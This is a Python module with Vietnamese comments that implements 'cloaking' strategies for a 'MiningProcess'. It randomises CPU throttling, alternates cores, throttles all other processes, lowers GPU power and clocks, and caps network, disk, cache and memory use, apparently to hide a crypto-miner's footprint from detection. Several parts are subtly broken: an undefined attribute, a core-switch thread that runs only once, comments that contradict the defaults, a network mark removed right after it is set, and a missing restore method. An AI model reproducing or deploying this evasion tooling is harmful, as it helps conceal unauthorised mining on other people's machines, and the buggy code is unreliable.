"""
Module cloak_strategies.py - Triển khai các chiến lược cloaking (CPU, GPU, Network, Disk I/O, Cache, Memory)
theo mô hình đồng bộ (synchronous + threading).
Đảm bảo tương thích với ResourceManager đã refactor (không dùng async/await).
"""


import os
import logging
import subprocess
import psutil
import pynvml
import traceback
import threading
import time
import re
import random
from abc import ABC, abstractmethod
from typing import Dict, Any, List, Tuple, Optional, Type

from .utils import MiningProcess

# Nếu cần resource managers từ resource_control:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from .resource_control import (
        CPUResourceManager,
        GPUResourceManager,
        NetworkResourceManager,
        DiskIOResourceManager,
        CacheResourceManager,
        MemoryResourceManager
    )

###############################################################################
#                 LỚP CƠ SỞ: CloakStrategy (ABSTRACT)                         #
###############################################################################
class CloakStrategy(ABC):
    """
    Lớp cơ sở cho tất cả CloakStrategy (CPU/GPU/Network/DiskIO/Cache/Memory) chạy đồng bộ.
    Các hàm apply(...) và restore(...) được chuyển sang hàm đồng bộ (def).
    """

    @abstractmethod
    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking cho tiến trình (đồng bộ).
        
        :param process: Đối tượng MiningProcess.
        :return: None
        """
        pass

    @abstractmethod
    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cài đặt ban đầu cho tiến trình (đồng bộ).

        :param process: Đối tượng MiningProcess.
        :return: None
        """
        pass

###############################################################################
#                 CPU STRATEGY: CpuCloakStrategy                              #
###############################################################################

class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU đồng bộ:
      - Giới hạn CPU bằng cgroup,
      - Tối ưu cache CPU (tuỳ ý),
      - Đặt affinity,
      - Hạn chế tiến trình bên ngoài (throttle_external).
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cpu_resource_manager: "CPUResourceManager"
    ):
        """
        Khởi tạo CpuCloakStrategy.

        :param config: Cấu hình cloaking CPU (dict).
        :param logger: Logger.
        :param cpu_resource_manager: ResourceManager liên quan đến CPU.
        """
        self.logger = logger
        self.config = config
        self.cpu_resource_manager = cpu_resource_manager

        # Lưu trữ tên cgroup cho mỗi PID
        self.process_cgroup: Dict[int, str] = {}

        # Giới hạn CPU ban đầu
        self.throttle_percentage = config.get('throttle_percentage', 70)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 60%.")
            self.throttle_percentage = 70

        # Cores chẵn và lẻ
        self.even_cores = [i for i in range(psutil.cpu_count(logical=True)) if i % 2 == 0]
        self.odd_cores = [i for i in range(psutil.cpu_count(logical=True)) if i % 2 != 0]

        # Bắt đầu với cores chẵn
        self.target_cores = self.even_cores

        # Đồng bộ hóa cores
        self.core_lock = threading.Lock()

        # Thời gian chuyển đổi giữa chẵn và lẻ
        self.switch_interval = config.get("switch_interval", 120)  # Mặc định 60 giây

        # Tạo luồng nền để cập nhật throttle_percentage
        self.dynamic_throttle = config.get('dynamic_throttle', True)
        if self.dynamic_throttle:
            self.update_interval = config.get('update_interval', 120)  # Cập nhật mỗi 60 giây
            self.dynamic_thread = threading.Thread(target=self._update_throttle_percentage, daemon=True)
            self.dynamic_thread.start()

        # Bắt đầu luồng thay đổi core
        self.dynamic_thread = threading.Thread(target=self._switch_cores, daemon=True)
        self.dynamic_thread.start()

        # Giới hạn CPU tiến trình bên ngoài
        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
            self.logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
            self.throttle_external_percentage = 30

        # Danh sách PID không bị hạn chế
        self.exempt_pids = config.get('exempt_pids', [])

    def _update_throttle_percentage(self) -> None:
        """
        Luồng chạy nền để cập nhật throttle_percentage động.
        """
        while True:
            try:
                # Tạo giá trị throttle_percentage ngẫu nhiên từ 60% đến 90%
                self.throttle_percentage = random.uniform(60, 90)
                self.logger.info(f"Đã cập nhật throttle_percentage động: {self.throttle_percentage:.2f}%.")

                # Áp dụng lại throttle cho tất cả các tiến trình đang được quản lý
                for pid, cgroup_name in self.process_cgroup.items():
                    try:
                        self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, cgroup_name)
                        self.logger.info(
                            f"Đã áp dụng lại throttle_percentage={self.throttle_percentage:.2f}% cho PID={pid}."
                        )
                    except Exception as e:
                        self.logger.error(
                            f"Lỗi khi áp dụng lại throttle_percentage cho PID={pid}: {e}"
                        )
            except Exception as e:
                self.logger.error(f"Lỗi khi cập nhật throttle_percentage động: {e}")

            # Chờ đến lần cập nhật tiếp theo
            time.sleep(self.update_interval)

    def _switch_cores(self):
        """
        Chuyển đổi giữa cores chẵn và lẻ, đồng thời cập nhật hoặc xóa cgroup.
        """
        try:
            with self.core_lock:
                if self.target_cores == self.even_cores:
                    self.target_cores = self.odd_cores
                    self.logger.info("Chuyển sang cores lẻ.")
                else:
                    self.target_cores = self.even_cores
                    self.logger.info("Chuyển sang cores chẵn.")
                
                # Xóa cgroup không còn sử dụng
                for pid, cgroup_name in list(self.process_cgroup.items()):
                    if not os.path.exists(os.path.join(self.CGROUP_CPU_BASE, cgroup_name)):
                        del self.process_cgroup[pid]
                        self.logger.info(f"Đã xóa thông tin cgroup {cgroup_name} cho PID={pid}.")
        except Exception as e:
            self.logger.error(f"Lỗi khi chuyển đổi danh sách cores: {e}")

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng CPU cloaking (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name

            # # Lấy tên cgroup hiện tại hoặc tạo mới nếu chưa có
            # cgroup_name = self.process_cgroup.get(pid)
            # cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, cgroup_name)
            
            # if cgroup_name:
            #     self.process_cgroup[pid] = cgroup_name
            #     self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage:.2f}% cho {name}(PID={pid}).")
            # else:
            #     self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
            #     return

            # Lấy tên cgroup hiện tại hoặc tạo mới nếu chưa có
            cgroup_name = self.process_cgroup.get(pid)
            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage, cgroup_name)

            if cgroup_name:
                self.process_cgroup[pid] = cgroup_name
                self.logger.info(f"[CPU Cloaking] Giới hạn CPU={self.throttle_percentage:.2f}% cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[CPU Cloaking] Không thể giới hạn CPU cho {name}(PID={pid}).")
                return

            # Đặt CPU affinity với cores chẵn/lẻ và cập nhật cgroup
            with self.core_lock:
                success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(
                    pid, self.target_cores, cgroup_name=cgroup_name
                )

            if success_affinity:
                self.logger.info(
                    f"[CPU Cloaking] Đặt CPU affinity và cập nhật cgroup với cores {self.target_cores} cho {name}(PID={pid})."
                )
            else:
                self.logger.error(f"[CPU Cloaking] Không thể đặt CPU affinity hoặc cập nhật cgroup cho {name}(PID={pid}).")


            # Tối ưu cache CPU
            success_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
            if success_cache:
                self.logger.info(f"[CPU Cloaking] Tối ưu cache cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[CPU Cloaking] Không thể tối ưu cache cho {name}(PID={pid}).")

            # Hạn chế tiến trình bên ngoài
            outside_ok = self.cpu_resource_manager.limit_cpu_for_external_processes(
                [pid] + self.exempt_pids,
                self.throttle_external_percentage
            )
            if outside_ok:
                self.logger.info(f"[CPU Cloaking] Hạn chế CPU outside => throttle={self.throttle_external_percentage}%.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"CPU Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"CPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục CPU cài đặt (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name

            # Gọi hàm restore_resources để khôi phục toàn bộ tài nguyên
            success_restore = self.cpu_resource_manager.restore_resources(pid)
            if success_restore:
                self.logger.info(f"[CPU Restore] Tài nguyên CPU đã được khôi phục cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[CPU Restore] Không thể khôi phục tài nguyên CPU cho {name}(PID={pid}).")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"CPU Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"CPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục CPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################
class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU đồng bộ:
      - Giới hạn power limit,
      - Set xung nhịp,
      - (Tuỳ chọn) limit_temperature => hạ xung nhịp nếu GPU nóng,
      - Khôi phục cài đặt gốc khi restore().
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: "GPUResourceManager"
    ):
        """
        Khởi tạo GpuCloakStrategy.

        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU.
        """
        self.logger = logger
        self.config = config
        self.gpu_resource_manager = gpu_resource_manager

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring
        
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        self.target_sm_clock = config.get('sm_clock', 1240)
        self.target_mem_clock = config.get('mem_clock', 877)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng GPU cloaking (đồng bộ).
        
        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name

            gpu_count = self.gpu_resource_manager.get_gpu_count()
            if gpu_count == 0:
                self.logger.warning("[GPU Cloaking] Hệ thống không có GPU. Bỏ qua cloaking.")
                return

            # Giới hạn power + set clocks cho mỗi GPU
            for gpu_index in range(gpu_count):
                current_pl = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
                if current_pl is None:
                    self.logger.error(f"[GPU Cloaking] Không thể lấy power limit cho GPU={gpu_index}.")
                    continue

            # Bỏ qua nếu công suất hiện tại đã thấp hơn 100W
                if current_pl <= 100:
                    self.logger.warning(f"[GPU Cloaking] GPU={gpu_index} => power={current_pl}W (PID={pid}).")
                    continue
                
                desired_pl = int(round(current_pl * (1 - self.throttle_percentage / 100)))
                ok_pl = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_pl)
                if ok_pl:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => power={desired_pl}W (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn power limit cho GPU={gpu_index}.")

                ok_clocks = self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index,
                                                                     self.target_sm_clock,
                                                                     self.target_mem_clock)
                if ok_clocks:
                    self.logger.info(f"[GPU Cloaking] GPU={gpu_index} => SM={self.target_sm_clock}, MEM={self.target_mem_clock} (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể set clocks cho GPU={gpu_index}.")


            # limit_temperature (nếu cần)
            for gpu_index in range(gpu_count):
                if self.stop_monitoring:  # Kiểm tra cờ dừng giám sát
                    self.logger.info("[GPU Cloaking] Dừng giám sát nhiệt độ do yêu cầu khôi phục tài nguyên.")
                    break
                
                # Reset success_temp cho mỗi GPU
                success_temp = self.gpu_resource_manager.limit_temperature(
                    gpu_index=gpu_index,
                    temperature_threshold=self.temperature_threshold,
                    fan_speed_increase=0  # Không tăng tốc độ quạt
                )
                
                if success_temp:
                    self.logger.info(f"[GPU Cloaking] Giới hạn nhiệt độ cho GPU={gpu_index} (PID={pid}).")
                else:
                    self.logger.error(f"[GPU Cloaking] Không thể giới hạn nhiệt độ cho GPU={gpu_index}.")

            # Chờ 10 giây trước khi kiểm tra lại
            time.sleep(900)

        except psutil.NoSuchProcess as e:
            self.logger.error(f"GPU Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"GPU Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục GPU cài đặt gốc (đồng bộ).
        
        :param process: Đối tượng MiningProcess.
        """
        try:
            self.stop_monitoring = True  # Dừng giám sát nhiệt độ khi khôi phục tài nguyên

            pid, name = process.pid, process.name
            success = self.gpu_resource_manager.restore_resources(pid)
            if success:
                self.logger.info(f"[GPU Restore] Đã khôi phục GPU cho {name}(PID={pid}).")
            else:
                self.logger.error(f"[GPU Restore] Không thể khôi phục GPU cho {name}(PID={pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"GPU Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"GPU Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục GPU cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#            NETWORK STRATEGY: NetworkCloakStrategy                           #
###############################################################################
class NetworkCloakStrategy(CloakStrategy):
    """
    Cloaking mạng (đồng bộ):
      - Đánh dấu pid bằng iptables,
      - Giới hạn băng thông (tc),
      - Khôi phục khi restore().
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        network_resource_manager: "NetworkResourceManager"
    ):
        """
        Khởi tạo NetworkCloakStrategy.

        :param config: Cấu hình cloaking Network (dict).
        :param logger: Logger.
        :param network_resource_manager: ResourceManager liên quan đến Network.
        """
        self.logger = logger
        self.config = config
        self.network_resource_manager = network_resource_manager

        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if self.bandwidth_reduction_mbps <= 0:
            self.logger.warning("bandwidth_reduction_mbps không hợp lệ, mặc định=10.")
            self.bandwidth_reduction_mbps = 10

        self.network_interface = config.get('network_interface') or "eth0"
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking mạng (đồng bộ).
        
        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name
            mark = pid % 32768  # Dùng pid để tạo mark

            ok_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not ok_mark:
                self.logger.error(f"[Net Cloaking] Không thể MARK iptables cho PID={pid}.")
                return

            ok_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface, mark, self.bandwidth_reduction_mbps
            )
            if not ok_limit:
                self.logger.error(f"[Net Cloaking] Giới hạn băng thông thất bại (iface={self.network_interface}).")
                return

            self.process_marks[pid] = mark
            self.logger.info(f"[Net Cloaking] Limit={self.bandwidth_reduction_mbps}Mbps cho PID={pid}, iface={self.network_interface}.")

            # Rollback mark_packets
            self.network_resource_manager.unmark_packets(pid, mark)
            return

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Net Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Net Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking mạng cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục tài nguyên mạng cho một tiến trình cụ thể.

        :param process: Đối tượng MiningProcess cần khôi phục tài nguyên.
        """
        try:
            pid, name = process.pid, process.name

            self.logger.debug(f"[Net Restore] Bắt đầu khôi phục tài nguyên cho PID={pid}, Name={name}.")
            if self.restore_resources(pid=pid):
                self.logger.info(f"[Net Restore] Đã khôi phục tài nguyên mạng cho PID={pid}, Name={name}.")
            else:
                self.logger.error(f"[Net Restore] Khôi phục tài nguyên mạng thất bại cho PID={pid}, Name={name}.")
        except Exception as e:
            self.logger.error(f"[Net Restore] Lỗi không xác định khi khôi phục mạng cho {name}(PID={pid}): {e}\n{traceback.format_exc()}")
            raise

###############################################################################
#            DISK IO STRATEGY: DiskIoCloakStrategy                            #
###############################################################################
class DiskIoCloakStrategy(CloakStrategy):
    """
    Cloaking Disk I/O (đồng bộ) qua ionice hoặc cgroup I/O (tuỳ triển khai).
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        disk_io_resource_manager: "DiskIOResourceManager"
    ):
        """
        Khởi tạo DiskIoCloakStrategy.

        :param config: Cấu hình cloaking Disk IO (dict).
        :param logger: Logger.
        :param disk_io_resource_manager: ResourceManager liên quan đến Disk I/O.
        """
        self.logger = logger
        self.config = config
        self.disk_io_resource_manager = disk_io_resource_manager

        self.io_weight = config.get('io_weight', 3)
        if not isinstance(self.io_weight, int) or not (0 <= self.io_weight <= 7):
            self.logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định=3.")
            self.io_weight = 3

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Disk I/O (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if ok:
                self.logger.info(f"[DiskIO Cloaking] PID={pid}, io_weight={self.io_weight}.")
            else:
                self.logger.error(f"[DiskIO Cloaking] Không thể set io_weight cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Disk I/O (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.disk_io_resource_manager.restore_resources(pid)
            if ok:
                self.logger.info(f"[DiskIO Restore] Khôi phục I/O cho PID={pid}.")
            else:
                self.logger.error(f"[DiskIO Restore] Không thể khôi phục I/O cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"DiskIO Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"DiskIO Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục DiskIO cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy(CloakStrategy):
    """
    Cloaking Cache (đồng bộ):
      - Drop caches,
      - Giới hạn cache usage,
      - Khôi phục khi restore => set 100%.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: "CacheResourceManager"
    ):
        """
        Khởi tạo CacheCloakStrategy.

        :param config: Cấu hình cloaking Cache (dict).
        :param logger: Logger.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cache_resource_manager

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Cache (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name
            ok_drop = self.cache_resource_manager.drop_caches(pid)
            if ok_drop:
                self.logger.info(f"[Cache Cloaking] Đã drop caches (PID={pid}).")

            ok_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
            if ok_limit:
                self.logger.info(f"[Cache Cloaking] Giới hạn cache={self.cache_limit_percent}% cho PID={pid}.")
            else:
                self.logger.error(f"[Cache Cloaking] Không thể limit cache cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Cache Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục cache (đặt=100%) (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.limit_cache_usage(100, pid)
            if ok:
                self.logger.info(f"[Cache Restore] Đã khôi phục cache=100% cho PID={pid}.")
            else:
                self.logger.error(f"[Cache Restore] Không thể khôi phục cache cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Cache Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Cache Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Cache cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy                              #
###############################################################################
class MemoryCloakStrategy(CloakStrategy):
    """
    Cloaking Memory (đồng bộ):
      - Drop caches (nếu cần),
      - Giới hạn memory usage,
      - Khôi phục => remove memory limit, cache=100%.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: "MemoryResourceManager",
        cache_resource_manager: "CacheResourceManager"
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking Memory (dict).
        :param logger: Logger.
        :param memory_resource_manager: ResourceManager về Memory.
        :param cache_resource_manager: ResourceManager về Cache (để drop hoặc set 100%).
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = memory_resource_manager
        self.cache_resource_manager = cache_resource_manager

        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            self.logger.warning(f"memory_limit_percent={self.memory_limit_percent} không hợp lệ, mặc định=50%.")
            self.memory_limit_percent = 50

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng cloaking Memory (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Drop caches
            ok_drop = self.cache_resource_manager.drop_caches(pid)
            if ok_drop:
                self.logger.info(f"[Memory Cloaking] Đã drop caches (PID={pid}).")

            # 2) Giới hạn memory
            total_mem_bytes = psutil.virtual_memory().total
            limit_bytes = int(round(self.memory_limit_percent / 100 * total_mem_bytes))
            limit_mb = limit_bytes // (1024 * 1024)

            ok_limit = self.memory_resource_manager.set_memory_limit(pid, limit_mb)
            if ok_limit:
                self.logger.info(f"[Memory Cloaking] Giới hạn={limit_mb}MB (~{self.memory_limit_percent}%) cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Cloaking] Không thể set memory_limit cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Memory Cloaking: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi cloaking Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục memory limit + cache=100% (đồng bộ).

        :param process: Đối tượng MiningProcess.
        """
        try:
            pid, name = process.pid, process.name

            # 1) Bỏ giới hạn memory
            ok_restore_mem = self.memory_resource_manager.restore_resources(pid)
            if ok_restore_mem:
                self.logger.info(f"[Memory Restore] Khôi phục memory cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục memory cho PID={pid}.")

            # 2) Cache=100%
            ok_cache = self.cache_resource_manager.limit_cache_usage(100, pid)
            if ok_cache:
                self.logger.info(f"[Memory Restore] Khôi phục cache=100% cho PID={pid}.")
            else:
                self.logger.error(f"[Memory Restore] Không thể khôi phục cache cho PID={pid}.")
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Memory Restore: Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Memory Restore: Không đủ quyền cho PID={process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khôi phục Memory cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

###############################################################################
#                     FACTORY: CloakStrategyFactory                           #
###############################################################################
class CloakStrategyFactory:
    """
    Factory tạo các instance chiến lược cloaking cho CPU, GPU, Network, DiskIO, Cache, Memory (đồng bộ).
    """

    STRATEGY_MAP: Dict[str, Type[CloakStrategy]] = {
        "cpu": CpuCloakStrategy,
        "gpu": GpuCloakStrategy,
        "network": NetworkCloakStrategy,
        "disk_io": DiskIoCloakStrategy,
        "cache": CacheCloakStrategy
        # Memory strategy cần 2 manager (memory + cache) => handle riêng
    }

    @staticmethod
    def create_strategy(
        strategy_name: str,
        config: Dict[str, Any],
        logger: logging.Logger,
        resource_managers: Dict[str, Any]
    ) -> Optional[CloakStrategy]:
        """
        Trả về instance CloakStrategy tương ứng strategy_name (đồng bộ).

        :param strategy_name: 'cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory'.
        :param config: Config cloaking (dict).
        :param logger: Logger.
        :param resource_managers: dict { 'cpu': CPUResourceManager, 'gpu': GPUResourceManager, ... }
        :return: Strategy instance (đồng bộ) hoặc None nếu thất bại.
        """
        name_lower = strategy_name.lower().strip()

        # Trường hợp đặc biệt: 'memory'
        if name_lower == "memory":
            memory_rm = resource_managers.get('memory')
            cache_rm = resource_managers.get('cache')
            if not memory_rm or not cache_rm:
                logger.error("Memory hoặc Cache ResourceManager không tồn tại, không thể tạo MemoryCloakStrategy.")
                return None
            return MemoryCloakStrategy(config, logger, memory_rm, cache_rm)

        # Trường hợp chung
        strategy_class = CloakStrategyFactory.STRATEGY_MAP.get(name_lower)
        if not strategy_class:
            logger.error(f"Không tìm thấy CloakStrategy tương ứng với '{strategy_name}'.")
            return None

        # Lấy resource manager phù hợp
        rm = resource_managers.get(name_lower)
        if not rm:
            logger.error(f"ResourceManager cho '{name_lower}' không tồn tại trong resource_managers.")
            return None

        try:
            strategy_instance = strategy_class(config, logger, rm)
            return strategy_instance
        except Exception as e:
            logger.error(f"Lỗi khi tạo strategy '{strategy_name}': {e}\n{traceback.format_exc()}")
            return None
